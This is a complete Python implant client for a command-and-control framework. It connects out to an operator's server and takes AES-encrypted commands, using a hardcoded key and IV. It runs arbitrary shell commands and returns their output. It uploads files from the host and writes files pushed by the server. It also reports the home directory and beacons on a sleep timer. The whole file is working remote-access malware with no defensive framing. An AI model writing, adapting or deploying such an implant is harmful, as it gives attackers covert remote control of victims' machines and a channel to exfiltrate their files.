#!/usr/bin/python3
import socket, sys, os, subprocess, argparse, time, ast, struct, gzip
from Crypto.Cipher import AES
parser = argparse.ArgumentParser(description='q*bert says hello')
parser.add_argument('-p', dest='port', required=True, type=int)
parser.add_argument('-s', dest='server', required=True)
args = parser.parse_args()
aeskey = 'This is a key123'
aesiv = 'This is an IV456'
timer = 0
def do_encrypt(message):
    if isinstance(message, bytes):
        pass
    else:
        message = bytes(message, 'utf-8')
    message = gzip.compress(message)
    length = 16 - (len(message) % 16)
    message += bytes([length])*length
    obj = AES.new(aeskey, AES.MODE_CBC, aesiv)
    cipher = obj.encrypt(message)
    return cipher

def do_decrypt(ciphertext):
    obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
    message = obj2.decrypt(ciphertext)
    return gzip.decompress(message[:-message[-1]])

def get_data(conn, buff):
    bs = conn.recv(8)
    try:
        (length,) = struct.unpack('>Q', bs)
    except struct.error as err:
        print("{0}".format(err))
        return 0
    data = b''
    while len(data) < length:
        to_read = length - len(data)
        data += conn.recv(buff if to_read > buff else to_read)
    return data

def sendit(conn, message):
    length = struct.pack('>Q', len(message))
    conn.sendall(length)
    conn.sendall(message)

def update_aeskeys(command):
    global aeskey
    global aesiv
    aeskey = command[1]
    aesiv = command[2]

def main():
    global timer
    conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    buff = 4096
    conn.connect((args.server, args.port))
    while True:
        try:
            data = get_data(conn, buff)
            if data == 0:
                break
            received = str(do_decrypt(data).strip(), 'utf-8')
            command = received.split(' ')
            if 'sleep' in command:
                timer = int(command[2])
                break
            elif 'goodbye' in command:
                exit(0)
            elif 'cmd' in command:
                del command[0]
                output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                sendit(conn, do_encrypt(output.stdout))
            elif 'Arsenal' in command:
                sendit(conn, do_encrypt('Client initial checkin\nHomedir: %s\n' %os.environ.get('HOME')))
            elif 'get_file' in command:
                with open(command[1], 'rb') as f:
                    tmp = f.read()
                sendit(conn, do_encrypt(tmp))
            elif 'send_file' in command:
                data1 = get_data(conn, buff)
                with open(command[2], 'wb+') as f:
                    f.write(do_decrypt(data1))
                sendit(conn, do_encrypt('OK'))
            elif 'aeskey' in command:
                update_aeskeys(command)
                sendit(conn, do_encrypt('Updated AES key'))
        except Exception as err:
            sendit(conn, do_encrypt("{0}\n".format(err)))
    return

if __name__ == '__main__':
    while True:
            main()
            if timer == 0:
                exit(0)
            time.sleep(timer)
            timer = 0
